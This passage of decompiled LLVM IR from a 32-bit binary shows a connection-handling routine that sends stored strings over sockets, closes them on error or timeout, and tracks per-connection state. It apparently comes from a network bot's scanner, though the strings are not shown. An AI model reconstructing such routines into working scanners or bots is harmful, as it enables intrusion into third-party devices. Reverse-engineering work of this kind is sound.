  store i32 %v1_804a42569, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b39b = load i32, i32* %v1_804b177, align 4
  %v1_804b3a8 = and i32 %v2_804b39b, -256
  store i32 %v1_804b3a8, i32* %eax.global-to-local, align 4
  %v4_804b3ab = inttoptr i32 %v2_804b39b to i8*
  store i32 %v2_804b39b, i32* @edi, align 4
  %v3_804b3b1 = call i32 @_strlen(i8* %v4_804b3ab)
  %v0_804b3be = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b3c4 = mul i32 %v0_804b3be, 24
  %v1_804b3c9 = add i32 %v2_804ab1c, %v2_804b3c4
  %v1_804b3cc = trunc i32 %v3_804b3b1 to i16
  %v3_804b3cc = inttoptr i32 %v1_804b3c9 to i16*
  store i16 %v1_804b3cc, i16* %v3_804b3cc, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v1_804b11d, i32* %eax.global-to-local, align 4
  %v2_804b3e3 = load i32, i32* %v1_804b120, align 4
  store i32 %v2_804b3e3, i32* %eax.global-to-local, align 4
  %v1_804b3e5 = add i32 %v2_804b3e3, 30
  store i32 %v1_804b3e5, i32* @ebx, align 4
  %v0_804b3e8 = load i32, i32* @esp, align 4
  %v1_804b3e8 = inttoptr i32 %v0_804b3e8 to i32*
  store i32 0, i32* %v1_804b3e8, align 4
  %v1_804b3ef = inttoptr i32 %v2_804b39b to i32*
  %v2_804b3ef = call i32 @__GI_time(i32* %v1_804b3ef)
  store i32 %v2_804b3ef, i32* %eax.global-to-local, align 4
  %v0_804b3f4 = load i32, i32* @ebx, align 4
  %v7_804b3f4 = icmp ult i32 %v0_804b3f4, %v2_804b3ef
  %v1_804b3f6 = icmp eq i1 %v7_804b3f4, false
  br i1 %v1_804b3f6, label %dec_label_pc_804b759, label %dec_label_pc_804b3fc

dec_label_pc_804b3fc:                             ; preds = %dec_label_pc_804b384
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b40b = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b40b, i32* %eax.global-to-local, align 4
  %v1_804b40e = load i32, i32* @esp, align 4
  %v2_804b40e = inttoptr i32 %v1_804b40e to i32*
  store i32 %v4_804b40b, i32* %v2_804b40e, align 4
  %v1_804b411 = call i32 @sclose(i32 %v2_804b39b)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b439 = add i32 %v2_804a289, %v2_804a306
  %v4_804b439 = inttoptr i32 %v3_804b439 to i8*
  store i8 1, i8* %v4_804b439, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b443:                             ; preds = %dec_label_pc_804a2fa
  %v0_804b443 = load i32, i32* bitcast ([4 x i8*]* @global_var_8055668.42 to i32*), align 8
  %v5_804b44d = inttoptr i32 %v0_804b443 to i8*
  %v1_804b453 = and i32 %v0_804b443, -256
  store i32 %v1_804b453, i32* %eax.global-to-local, align 4
  store i32 %v0_804b443, i32* @edi, align 4
  %v3_804b45c = call i32 @_strlen(i8* %v5_804b44d)
  store i32 %v3_804b45c, i32* @ebx, align 4
  %v0_804b465 = load i32, i32* bitcast ([4 x i8*]* @global_var_8055668.42 to i32*), align 8
  store i32 %v0_804b465, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v2_804b47a = add i32 %v2_804a306, %v2_804a245
  %v3_804b47a = inttoptr i32 %v2_804b47a to i32*
  %v4_804b47a = load i32, i32* %v3_804b47a, align 8
  store i32 %v4_804b47a, i32* %eax.global-to-local, align 4
  %v0_804b47d = load i32, i32* @esp, align 4
  %v1_804b47d = add i32 %v0_804b47d, 12
  %v2_804b47d = inttoptr i32 %v1_804b47d to i32*
  store i32 16384, i32* %v2_804b47d, align 4
  %v0_804b485 = load i32, i32* @ebx, align 4
  %v1_804b485 = load i32, i32* @esp, align 4
  %v2_804b485 = add i32 %v1_804b485, 8
  %v3_804b485 = inttoptr i32 %v2_804b485 to i32*
  store i32 %v0_804b485, i32* %v3_804b485, align 4
  %v0_804b489 = load i32, i32* @esi, align 4
  %v1_804b489 = load i32, i32* @esp, align 4
  %v2_804b489 = add i32 %v1_804b489, 4
  %v3_804b489 = inttoptr i32 %v2_804b489 to i32*
  store i32 %v0_804b489, i32* %v3_804b489, align 4
  %v0_804b48d = load i32, i32* %eax.global-to-local, align 4
  %v1_804b48d = load i32, i32* @esp, align 4
  %v2_804b48d = inttoptr i32 %v1_804b48d to i32*
  store i32 %v0_804b48d, i32* %v2_804b48d, align 4
  %v5_804b490 = call i32 @__libc_send(i32 %v0_804b443, i32 %stack_var_-240.261, i32 %stack_var_-236.259, i32 %stack_var_-232.257)
  store i32 %v5_804b490, i32* %eax.global-to-local, align 4
  %v2_804b495 = icmp slt i32 %v5_804b490, 0
  %v1_804b497 = icmp eq i1 %v2_804b495, false
  br i1 %v1_804b497, label %dec_label_pc_804b4c6, label %dec_label_pc_804b499

dec_label_pc_804b499:                             ; preds = %dec_label_pc_804b443
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b4bc = add i32 %v2_804a289, %v2_804a306
  %v4_804b4bc = inttoptr i32 %v3_804b4bc to i8*
  store i8 1, i8* %v4_804b4bc, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b4c6:                             ; preds = %dec_label_pc_804b443
  %v0_804b4c6 = load i32, i32* bitcast ([61 x i8]** @global_var_8055674.43 to i32*), align 4
  %v5_804b4d0 = inttoptr i32 %v0_804b4c6 to i8*
  %v1_804b4d6 = and i32 %v0_804b4c6, -256
  store i32 %v1_804b4d6, i32* %eax.global-to-local, align 4
  store i32 %v0_804b4c6, i32* @edi, align 4
  %v3_804b4df = call i32 @_strlen(i8* %v5_804b4d0)
  store i32 %v3_804b4df, i32* @ebx, align 4
  %v0_804b4e8 = load i32, i32* bitcast ([61 x i8]** @global_var_8055674.43 to i32*), align 4
  store i32 %v0_804b4e8, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b4fd = load i32, i32* %v3_804b47a, align 8
  store i32 %v4_804b4fd, i32* %eax.global-to-local, align 4
  %v0_804b500 = load i32, i32* @esp, align 4
  %v1_804b500 = add i32 %v0_804b500, 12
  %v2_804b500 = inttoptr i32 %v1_804b500 to i32*
  store i32 16384, i32* %v2_804b500, align 4
  %v0_804b508 = load i32, i32* @ebx, align 4
  %v1_804b508 = load i32, i32* @esp, align 4
  %v2_804b508 = add i32 %v1_804b508, 8
  %v3_804b508 = inttoptr i32 %v2_804b508 to i32*
  store i32 %v0_804b508, i32* %v3_804b508, align 4
  %v0_804b50c = load i32, i32* @esi, align 4
  %v1_804b50c = load i32, i32* @esp, align 4
  %v2_804b50c = add i32 %v1_804b50c, 4
  %v3_804b50c = inttoptr i32 %v2_804b50c to i32*
  store i32 %v0_804b50c, i32* %v3_804b50c, align 4
  %v0_804b510 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b510 = load i32, i32* @esp, align 4
  %v2_804b510 = inttoptr i32 %v1_804b510 to i32*
  store i32 %v0_804b510, i32* %v2_804b510, align 4
  %v6_804b513 = call i32 @__libc_send(i32 %v0_804b4c6, i32 %v0_804b443, i32 %stack_var_-240.261, i32 %stack_var_-236.259)
  store i32 %v6_804b513, i32* %eax.global-to-local, align 4
  %v2_804b518 = icmp slt i32 %v6_804b513, 0
  %v1_804b51a = icmp eq i1 %v2_804b518, false
  br i1 %v1_804b51a, label %dec_label_pc_804b549, label %dec_label_pc_804b51c

dec_label_pc_804b51c:                             ; preds = %dec_label_pc_804b4c6
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b53f = add i32 %v2_804a289, %v2_804a306
  %v4_804b53f = inttoptr i32 %v3_804b53f to i8*
  store i8 1, i8* %v4_804b53f, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b549:                             ; preds = %dec_label_pc_804b4c6
  %v0_804b549 = load i32, i32* bitcast ([2 x i8*]* @global_var_805566c.44 to i32*), align 4
  %v5_804b553 = inttoptr i32 %v0_804b549 to i8*
  %v1_804b559 = and i32 %v0_804b549, -256
  store i32 %v1_804b559, i32* %eax.global-to-local, align 4
  store i32 %v0_804b549, i32* @edi, align 4
  %v3_804b562 = call i32 @_strlen(i8* %v5_804b553)
  store i32 %v3_804b562, i32* @ebx, align 4
  %v0_804b56b = load i32, i32* bitcast ([2 x i8*]* @global_var_805566c.44 to i32*), align 4
  store i32 %v0_804b56b, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b580 = load i32, i32* %v3_804b47a, align 8
  store i32 %v4_804b580, i32* %eax.global-to-local, align 4
  %v0_804b583 = load i32, i32* @esp, align 4
  %v1_804b583 = add i32 %v0_804b583, 12
  %v2_804b583 = inttoptr i32 %v1_804b583 to i32*
  store i32 16384, i32* %v2_804b583, align 4
  %v0_804b58b = load i32, i32* @ebx, align 4
  %v1_804b58b = load i32, i32* @esp, align 4
  %v2_804b58b = add i32 %v1_804b58b, 8
  %v3_804b58b = inttoptr i32 %v2_804b58b to i32*
  store i32 %v0_804b58b, i32* %v3_804b58b, align 4
  %v0_804b58f = load i32, i32* @esi, align 4
  %v1_804b58f = load i32, i32* @esp, align 4
  %v2_804b58f = add i32 %v1_804b58f, 4
  %v3_804b58f = inttoptr i32 %v2_804b58f to i32*
  store i32 %v0_804b58f, i32* %v3_804b58f, align 4
  %v0_804b593 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b593 = load i32, i32* @esp, align 4
  %v2_804b593 = inttoptr i32 %v1_804b593 to i32*
  store i32 %v0_804b593, i32* %v2_804b593, align 4
  %v7_804b596 = call i32 @__libc_send(i32 %v0_804b549, i32 %v0_804b4c6, i32 %v0_804b443, i32 %stack_var_-240.261)
  %v2_804b59b = icmp slt i32 %v7_804b596, 0
  %v1_804b59d = icmp eq i1 %v2_804b59b, false
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804b59d, label %dec_label_pc_804b5cc, label %dec_label_pc_804b59f

dec_label_pc_804b59f:                             ; preds = %dec_label_pc_804b549
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b5c2 = add i32 %v2_804a289, %v2_804a306
  %v4_804b5c2 = inttoptr i32 %v3_804b5c2 to i8*
  store i8 1, i8* %v4_804b5c2, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b5cc:                             ; preds = %dec_label_pc_804b549
  store i8 8, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804b5e5:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v2_804b5f4 = add i32 %v2_804a306, %v2_804a245
  %v1_804b5f6 = add i32 %v2_804b5f4, 12
  store i32 %v1_804b5f6, i32* %eax.global-to-local, align 4
  %v1_804b5f9 = inttoptr i32 %v1_804b5f6 to i32*
  %v2_804b5f9 = load i32, i32* %v1_804b5f9, align 4
  store i32 %v2_804b5f9, i32* %eax.global-to-local, align 4
  %v1_804b5fb = icmp eq i32 %v2_804b5f9, 0
  %v1_804b5fd = icmp eq i1 %v1_804b5fb, false
  br i1 %v1_804b5fd, label %dec_label_pc_804b623, label %dec_label_pc_804b5ff

dec_label_pc_804b5ff:                             ; preds = %dec_label_pc_804b5e5
  store i32 %v1_804a42569, i32* @ebx, align 4
  %v0_804b602 = load i32, i32* @esp, align 4
  %v1_804b602 = inttoptr i32 %v0_804b602 to i32*
  store i32 0, i32* %v1_804b602, align 4
  %v1_804b609 = inttoptr i32 %v6_804a309 to i32*
  %v2_804b609 = call i32 @__GI_time(i32* %v1_804b609)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804b613 = load i32, i32* @ebx, align 4
  %v2_804b619 = mul i32 %v0_804b613, 24
  %v2_804b61c = add i32 %v2_804b619, %v2_804a245
  %v1_804b61e = add i32 %v2_804b61c, 12
  store i32 %v1_804b61e, i32* %eax.global-to-local, align 4
  %v2_804b621 = inttoptr i32 %v1_804b61e to i32*
  store i32 %v2_804b609, i32* %v2_804b621, align 4
  br label %dec_label_pc_804b623

dec_label_pc_804b623:                             ; preds = %dec_label_pc_804b5e5, %dec_label_pc_804b5ff
  %v0_804b623 = load i32, i32* bitcast ([125 x i8]** @global_var_8055670.45 to i32*), align 16
  %v5_804b62d = inttoptr i32 %v0_804b623 to i8*
  %v1_804b633 = and i32 %v0_804b623, -256
  store i32 %v1_804b633, i32* %eax.global-to-local, align 4
  store i32 %v0_804b623, i32* @edi, align 4
  %v3_804b63c = call i32 @_strlen(i8* %v5_804b62d)
  store i32 %v3_804b63c, i32* @ebx, align 4
  %v0_804b645 = load i32, i32* bitcast ([125 x i8]** @global_var_8055670.45 to i32*), align 16
  store i32 %v0_804b645, i32* @esi, align 4
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b65a = inttoptr i32 %v2_804b5f4 to i32*
  %v4_804b65a = load i32, i32* %v3_804b65a, align 8
  store i32 %v4_804b65a, i32* %eax.global-to-local, align 4
  %v0_804b65d = load i32, i32* @esp, align 4
  %v1_804b65d = add i32 %v0_804b65d, 12
  %v2_804b65d = inttoptr i32 %v1_804b65d to i32*
  store i32 16384, i32* %v2_804b65d, align 4
  %v0_804b665 = load i32, i32* @ebx, align 4
  %v1_804b665 = load i32, i32* @esp, align 4
  %v2_804b665 = add i32 %v1_804b665, 8
  %v3_804b665 = inttoptr i32 %v2_804b665 to i32*
  store i32 %v0_804b665, i32* %v3_804b665, align 4
  %v0_804b669 = load i32, i32* @esi, align 4
  %v1_804b669 = load i32, i32* @esp, align 4
  %v2_804b669 = add i32 %v1_804b669, 4
  %v3_804b669 = inttoptr i32 %v2_804b669 to i32*
  store i32 %v0_804b669, i32* %v3_804b669, align 4
  %v0_804b66d = load i32, i32* %eax.global-to-local, align 4
  %v1_804b66d = load i32, i32* @esp, align 4
  %v2_804b66d = inttoptr i32 %v1_804b66d to i32*
  store i32 %v0_804b66d, i32* %v2_804b66d, align 4
  %v3_804b670 = ptrtoint i8* %stack_var_-252.267 to i32
  %v5_804b670 = ptrtoint i8* %stack_var_-248.265 to i32
  %v7_804b670 = ptrtoint i8* %stack_var_-244.263 to i32
  %v8_804b670 = call i32 @__libc_send(i32 %v0_804b623, i32 %v3_804b670, i32 %v5_804b670, i32 %v7_804b670)
  %v2_804b675 = icmp slt i32 %v8_804b670, 0
  %v1_804b677 = icmp eq i1 %v2_804b675, false
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804b677, label %dec_label_pc_804b6ee, label %dec_label_pc_804b679

dec_label_pc_804b679:                             ; preds = %dec_label_pc_804b623
  %v4_804b688 = load i32, i32* %v3_804b65a, align 8
  store i32 %v4_804b688, i32* %eax.global-to-local, align 4
  %v1_804b68b = load i32, i32* @esp, align 4
  %v2_804b68b = inttoptr i32 %v1_804b68b to i32*
  store i32 %v4_804b688, i32* %v2_804b68b, align 4
  %v2_804b68e = call i32 @sclose(i32 %v0_804b623)
  store i8 0, i8* %v4_804a309, align 8
  %v3_804b6b6 = add i32 %v2_804a289, %v2_804a306
  %v4_804b6b6 = inttoptr i32 %v3_804b6b6 to i8*
  store i8 1, i8* %v4_804b6b6, align 1
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  %v1_804b6cc = add i32 %v2_804b5f4, 20
  store i32 %v1_804b6cc, i32* %eax.global-to-local, align 4
  %v1_804b6cf = inttoptr i32 %v1_804b6cc to i32*
  %v2_804b6cf = load i32, i32* %v1_804b6cf, align 4
  store i32 %v2_804b6cf, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804b6d8 = load i32, i32* @esp, align 4
  %v2_804b6d8 = add i32 %v1_804b6d8, 8
  %v3_804b6d8 = inttoptr i32 %v2_804b6d8 to i32*
  store i32 1024, i32* %v3_804b6d8, align 4
  %v0_804b6dc = load i32, i32* @esp, align 4
  %v1_804b6dc = add i32 %v0_804b6dc, 4
  %v2_804b6dc = inttoptr i32 %v1_804b6dc to i32*
  store i32 0, i32* %v2_804b6dc, align 4
  %v0_804b6e4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b6e4 = load i32, i32* @esp, align 4
  %v2_804b6e4 = inttoptr i32 %v1_804b6e4 to i32*
  store i32 %v0_804b6e4, i32* %v2_804b6e4, align 4
  %v7_804b6e7 = call i32 @__GI_memset(i8* %v5_804b62d, i32 %v3_804b670, i32 %v5_804b670)
  store i32 %v7_804b6e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b759

dec_label_pc_804b6ee:                             ; preds = %dec_label_pc_804b623
  store i32 %v1_804b5f6, i32* %eax.global-to-local, align 4
  %v2_804b702 = load i32, i32* %v1_804b5f9, align 4
  store i32 %v2_804b702, i32* %eax.global-to-local, align 4
  %v1_804b704 = add i32 %v2_804b702, 45
  store i32 %v1_804b704, i32* @ebx, align 4
  %v0_804b707 = load i32, i32* @esp, align 4
  %v1_804b707 = inttoptr i32 %v0_804b707 to i32*
  store i32 0, i32* %v1_804b707, align 4
  %tmp44 = inttoptr i32 %v0_804b623 to i32*
  %v3_804b70e = call i32 @__GI_time(i32* %tmp44)
  store i32 %v3_804b70e, i32* %eax.global-to-local, align 4
  %v0_804b713 = load i32, i32* @ebx, align 4
  %v7_804b713 = icmp ult i32 %v0_804b713, %v3_804b70e
  %v1_804b715 = icmp eq i1 %v7_804b713, false
  br i1 %v1_804b715, label %dec_label_pc_804b759, label %dec_label_pc_804b717

dec_label_pc_804b717:                             ; preds = %dec_label_pc_804b6ee
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b726 = load i32, i32* %v3_804b65a, align 8
  store i32 %v4_804b726, i32* %eax.global-to-local, align 4
  %v1_804b729 = load i32, i32* @esp, align 4
  %v2_804b729 = inttoptr i32 %v1_804b729 to i32*
  store i32 %v4_804b726, i32* %v2_804b729, align 4
  %v2_804b72c = call i32 @sclose(i32 %v0_804b623)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a42569, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b754 = add i32 %v2_804a289, %v2_804a306
  %v4_804b754 = inttoptr i32 %v3_804b754 to i8*
  store i8 1, i8* %v4_804b754, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b759:                             ; preds = %dec_label_pc_804a2fa, %dec_label_pc_804b6ee, %dec_label_pc_804b384, %dec_label_pc_804aad9, %dec_label_pc_804a8f7, %dec_label_pc_804a4b3, %dec_label_pc_804aee9, %dec_label_pc_804b679, %dec_label_pc_804b5cc, %dec_label_pc_804b59f, %dec_label_pc_804b51c, %dec_label_pc_804b499, %dec_label_pc_804b3fc, %dec_label_pc_804b33a, %dec_label_pc_804b2c2, %dec_label_pc_804b228, %dec_label_pc_804ace3, %dec_label_pc_804ac9c, %dec_label_pc_804ac1f, %dec_label_pc_804ab51, %dec_label_pc_804aa5c, %dec_label_pc_804a924, %dec_label_pc_804a7da, %dec_label_pc_804a617, %dec_label_pc_804a5e4, %dec_label_pc_804a49a, %dec_label_pc_804b0f3, %dec_label_pc_804b0ac, %dec_label_pc_804b02f, %dec_label_pc_804af61, %dec_label_pc_804aea2, %dec_label_pc_804adbb, %dec_label_pc_804b717
  %stack_var_-224.1 = phi i32 [ %stack_var_-224.253, %dec_label_pc_804a2fa ], [ %stack_var_-224.253, %dec_label_pc_804b6ee ], [ %stack_var_-224.253, %dec_label_pc_804b717 ], [ %stack_var_-224.253, %dec_label_pc_804b679 ], [ %stack_var_-224.253, %dec_label_pc_804b5cc ], [ %stack_var_-224.253, %dec_label_pc_804b59f ], [ %stack_var_-224.253, %dec_label_pc_804b51c ], [ %stack_var_-224.253, %dec_label_pc_804b499 ], [ %stack_var_-224.253, %dec_label_pc_804b384 ], [ %stack_var_-224.253, %dec_label_pc_804b3fc ], [ %stack_var_-224.253, %dec_label_pc_804b33a ], [ %stack_var_-224.253, %dec_label_pc_804b2c2 ], [ %stack_var_-224.253, %dec_label_pc_804b228 ], [ %stack_var_-224.253, %dec_label_pc_804b0f3 ], [ %stack_var_-224.253, %dec_label_pc_804b0ac ], [ %stack_var_-224.253, %dec_label_pc_804b02f ], [ %stack_var_-224.253, %dec_label_pc_804aee9 ], [ %stack_var_-224.253, %dec_label_pc_804af61 ], [ %stack_var_-224.253, %dec_label_pc_804aea2 ], [ %stack_var_-224.253, %dec_label_pc_804adbb ], [ %stack_var_-224.253, %dec_label_pc_804ace3 ], [ %stack_var_-224.253, %dec_label_pc_804ac9c ], [ %stack_var_-224.253, %dec_label_pc_804ac1f ], [ %v2_804aaf0, %dec_label_pc_804aad9 ], [ %v2_804aaf0, %dec_label_pc_804ab51 ], [ %stack_var_-224.253, %dec_label_pc_804aa5c ], [ %stack_var_-224.253, %dec_label_pc_804a8f7 ], [ %stack_var_-224.253, %dec_label_pc_804a924 ], [ %stack_var_-224.253, %dec_label_pc_804a7da ], [ %stack_var_-224.253, %dec_label_pc_804a4b3 ], [ %stack_var_-224.253, %dec_label_pc_804a617 ], [ %stack_var_-224.253, %dec_label_pc_804a5e4 ], [ %stack_var_-224.253, %dec_label_pc_804a49a ]
  %stack_var_-228.1 = phi i32 [ %stack_var_-228.255, %dec_label_pc_804a2fa ], [ %stack_var_-228.255, %dec_label_pc_804b6ee ], [ %stack_var_-228.255, %dec_label_pc_804b717 ], [ %stack_var_-228.255, %dec_label_pc_804b679 ], [ %stack_var_-228.255, %dec_label_pc_804b5cc ], [ %stack_var_-228.255, %dec_label_pc_804b59f ], [ %stack_var_-228.255, %dec_label_pc_804b51c ], [ %stack_var_-228.255, %dec_label_pc_804b499 ], [ %stack_var_-228.255, %dec_label_pc_804b384 ], [ %stack_var_-228.255, %dec_label_pc_804b3fc ], [ %stack_var_-228.255, %dec_label_pc_804b33a ], [ %stack_var_-228.255, %dec_label_pc_804b2c2 ], [ %stack_var_-228.255, %dec_label_pc_804b228 ], [ %stack_var_-228.255, %dec_label_pc_804b0f3 ], [ %stack_var_-228.255, %dec_label_pc_804b0ac ], [ %stack_var_-228.255, %dec_label_pc_804b02f ], [ %stack_var_-228.255, %dec_label_pc_804aee9 ], [ %stack_var_-228.255, %dec_label_pc_804af61 ], [ %stack_var_-228.255, %dec_label_pc_804aea2 ], [ %stack_var_-228.255, %dec_label_pc_804adbb ], [ %v4_804abaf, %dec_label_pc_804ace3 ], [ %v4_804abaf, %dec_label_pc_804ac9c ], [ %v4_804abaf, %dec_label_pc_804ac1f ], [ %stack_var_-228.255, %dec_label_pc_804aad9 ], [ %stack_var_-228.255, %dec_label_pc_804ab51 ], [ %stack_var_-228.255, %dec_label_pc_804aa5c ], [ %stack_var_-228.255, %dec_label_pc_804a8f7 ], [ %stack_var_-228.255, %dec_label_pc_804a924 ], [ %stack_var_-228.255, %dec_label_pc_804a7da ], [ %stack_var_-228.255, %dec_label_pc_804a4b3 ], [ %stack_var_-228.255, %dec_label_pc_804a617 ], [ %stack_var_-228.255, %dec_label_pc_804a5e4 ], [ %stack_var_-228.255, %dec_label_pc_804a49a ]
  %stack_var_-232.1 = phi i32 [ %stack_var_-232.257, %dec_label_pc_804a2fa ], [ %stack_var_-232.257, %dec_label_pc_804b6ee ], [ %stack_var_-232.257, %dec_label_pc_804b717 ], [ %stack_var_-232.257, %dec_label_pc_804b679 ], [ %stack_var_-232.257, %dec_label_pc_804b5cc ], [ %stack_var_-232.257, %dec_label_pc_804b59f ], [ %stack_var_-232.257, %dec_label_pc_804b51c ], [ %stack_var_-232.257, %dec_label_pc_804b499 ], [ %stack_var_-232.257, %dec_label_pc_804b384 ], [ %stack_var_-232.257, %dec_label_pc_804b3fc ], [ %stack_var_-232.257, %dec_label_pc_804b33a ], [ %stack_var_-232.257, %dec_label_pc_804b2c2 ], [ %stack_var_-232.257, %dec_label_pc_804b228 ], [ %stack_var_-232.257, %dec_label_pc_804b0f3 ], [ %stack_var_-232.257, %dec_label_pc_804b0ac ], [ %stack_var_-232.257, %dec_label_pc_804b02f ], [ %v2_804af00, %dec_label_pc_804aee9 ], [ %v2_804af00, %dec_label_pc_804af61 ], [ %stack_var_-232.257, %dec_label_pc_804aea2 ], [ %stack_var_-232.257, %dec_label_pc_804adbb ], [ %stack_var_-232.257, %dec_label_pc_804ace3 ], [ %stack_var_-232.257, %dec_label_pc_804ac9c ], [ %stack_var_-232.257, %dec_label_pc_804ac1f ], [ %stack_var_-232.257, %dec_label_pc_804aad9 ], [ %stack_var_-232.257, %dec_label_pc_804ab51 ], [ %stack_var_-232.257, %dec_label_pc_804aa5c ], [ %stack_var_-232.257, %dec_label_pc_804a8f7 ], [ %stack_var_-232.257, %dec_label_pc_804a924 ], [ %stack_var_-232.257, %dec_label_pc_804a7da ], [ %stack_var_-232.257, %dec_label_pc_804a4b3 ], [ %stack_var_-232.257, %dec_label_pc_804a617 ], [ %stack_var_-232.257, %dec_label_pc_804a5e4 ], [ %stack_var_-232.257, %dec_label_pc_804a49a ]
  %stack_var_-236.1 = phi i32 [ %stack_var_-236.259, %dec_label_pc_804a2fa ], [ %stack_var_-236.259, %dec_label_pc_804b6ee ], [ %stack_var_-236.259, %dec_label_pc_804b717 ], [ %stack_var_-236.259, %dec_label_pc_804b679 ], [ %stack_var_-236.259, %dec_label_pc_804b5cc ], [ %stack_var_-236.259, %dec_label_pc_804b59f ], [ %stack_var_-236.259, %dec_label_pc_804b51c ], [ %stack_var_-236.259, %dec_label_pc_804b499 ], [ %stack_var_-236.259, %dec_label_pc_804b384 ], [ %stack_var_-236.259, %dec_label_pc_804b3fc ], [ %stack_var_-236.259, %dec_label_pc_804b33a ], [ %stack_var_-236.259, %dec_label_pc_804b2c2 ], [ %stack_var_-236.259, %dec_label_pc_804b228 ], [ %v4_804afbf, %dec_label_pc_804b0f3 ], [ %v4_804afbf, %dec_label_pc_804b0ac ], [ %v4_804afbf, %dec_label_pc_804b02f ], [ %stack_var_-236.259, %dec_label_pc_804aee9 ], [ %stack_var_-236.259, %dec_label_pc_804af61 ], [ %stack_var_-236.259, %dec_label_pc_804aea2 ], [ %stack_var_-236.259, %dec_label_pc_804adbb ], [ %stack_var_-236.259, %dec_label_pc_804ace3 ], [ %stack_var_-236.259, %dec_label_pc_804ac9c ], [ %stack_var_-236.259, %dec_label_pc_804ac1f ], [ %stack_var_-236.259, %dec_label_pc_804aad9 ], [ %stack_var_-236.259, %dec_label_pc_804ab51 ], [ %stack_var_-236.259, %dec_label_pc_804aa5c ], [ %stack_var_-236.259, %dec_label_pc_804a8f7 ], [ %stack_var_-236.259, %dec_label_pc_804a924 ], [ %stack_var_-236.259, %dec_label_pc_804a7da ], [ %stack_var_-236.259, %dec_label_pc_804a4b3 ], [ %stack_var_-236.259, %dec_label_pc_804a617 ], [ %stack_var_-236.259, %dec_label_pc_804a5e4 ], [ %stack_var_-236.259, %dec_label_pc_804a49a ]
  %stack_var_-240.1 = phi i32 [ %stack_var_-240.261, %dec_label_pc_804a2fa ], [ %stack_var_-240.261, %dec_label_pc_804b6ee ], [ %stack_var_-240.261, %dec_label_pc_804b717 ], [ %stack_var_-240.261, %dec_label_pc_804b679 ], [ %stack_var_-240.261, %dec_label_pc_804b5cc ], [ %stack_var_-240.261, %dec_label_pc_804b59f ], [ %stack_var_-240.261, %dec_label_pc_804b51c ], [ %stack_var_-240.261, %dec_label_pc_804b499 ], [ %v2_804b39b, %dec_label_pc_804b384 ], [ %v2_804b39b, %dec_label_pc_804b3fc ], [ %stack_var_-240.261, %dec_label_pc_804b33a ], [ %stack_var_-240.261, %dec_label_pc_804b2c2 ], [ %stack_var_-240.261, %dec_label_pc_804b228 ], [ %stack_var_-240.261, %dec_label_pc_804b0f3 ], [ %stack_var_-240.261, %dec_label_pc_804b0ac ], [ %stack_var_-240.261, %dec_label_pc_804b02f ], [ %stack_var_-240.261, %dec_label_pc_804aee9 ], [ %stack_var_-240.261, %dec_label_pc_804af61 ], [ %stack_var_-240.261, %dec_label_pc_804aea2 ], [ %stack_var_-240.261, %dec_label_pc_804adbb ], [ %stack_var_-240.261, %dec_label_pc_804ace3 ], [ %stack_var_-240.261, %dec_label_pc_804ac9c ], [ %stack_var_-240.261, %dec_label_pc_804ac1f ], [ %stack_var_-240.261, %dec_label_pc_804aad9 ], [ %stack_var_-240.261, %dec_label_pc_804ab51 ], [ %stack_var_-240.261, %dec_label_pc_804aa5c ], [ %stack_var_-240.261, %dec_label_pc_804a8f7 ], [ %stack_var_-240.261, %dec_label_pc_804a924 ], [ %stack_var_-240.261, %dec_label_pc_804a7da ], [ %stack_var_-240.261, %dec_label_pc_804a4b3 ], [ %stack_var_-240.261, 